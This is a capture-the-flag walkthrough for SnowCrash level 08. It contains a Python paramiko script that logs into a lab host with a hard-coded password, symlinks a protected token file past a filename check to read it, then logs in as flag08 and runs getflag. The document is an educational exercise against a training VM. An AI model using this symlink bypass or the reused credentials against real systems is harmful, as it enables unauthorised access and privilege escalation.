---
title: 42 SnowCrash Level08 - Walkthrough 🤖
tags:
  - ctf
  - exploit
  - python
  - snowcrash
categories:
  - ctfs
  - 42project
date: 2024-05-18 15:38:03
---

![snowcrash](/images/snowcrash.png)

### Introduction
In level 08, we exploit a vulnerable program `level08` to obtain the flag by leveraging a Python script that utilizes SSH to execute commands.

### Steps:

1. **Understanding Exploit Python Script:**
   We examine the provided Python script:

   ```python
   #!/usr/bin/python3

   try:
       from paramiko import SSHClient, AutoAddPolicy
       from time import sleep
   except ImportError as err:
       print(err)

   def get_token():
       client = SSHClient()
       client.set_missing_host_key_policy(AutoAddPolicy())
       client.connect('10.13.249.103', username='level08', password='fiumuikeil55xe9cu4dood66h', port=4242)
       sleep(1)
       stdin, stdout, stderr = client.exec_command('rm -rf /tmp/exploit && ln -s $(pwd)/token /tmp/exploit && ./level08 /tmp/exploit')
       output = stdout.read()
       return (output.decode('utf-8').split('\n')[0])

   def get_flag(token):
       client = SSHClient()
       client.set_missing_host_key_policy(AutoAddPolicy())
       client.connect('10.13.249.103', username='flag08', password=token, port=4242)
       sleep(1)
       stdin, stdout, stderr = client.exec_command('getflag')
       output = stdout.read()
       return (output.decode('utf-8').split('\n')[0])

   if __name__ == "__main__":
       token = get_token()

       print("[+] Humm the nunuts token... %s" % (token))
       print("[+] Flag08 : %s" % (get_flag(token)))
    ```

The script uses paramiko library to establish SSH connections. `get_token()` function connects to the `level08` user and creates a symbolic link `/tmp/exploit` to a file named `token`. It then executes `./level08 /tmp/exploit` to obtain the token. `get_flag()` function connects to the `flag08` user with the obtained token and retrieves the flag.

2. **Executing the Python Script**:
    We execute the Python script to retrieve the token and the flag:
    ```
    $ python3 exploit.py
    ```
    The script connects to the server, retrieves the token, and then uses it to connect as `flag08` and obtain the flag.

# Conclusion
By exploiting the vulnerability in the level08 program using the provided Python script, we successfully retrieved the flag for level 08.
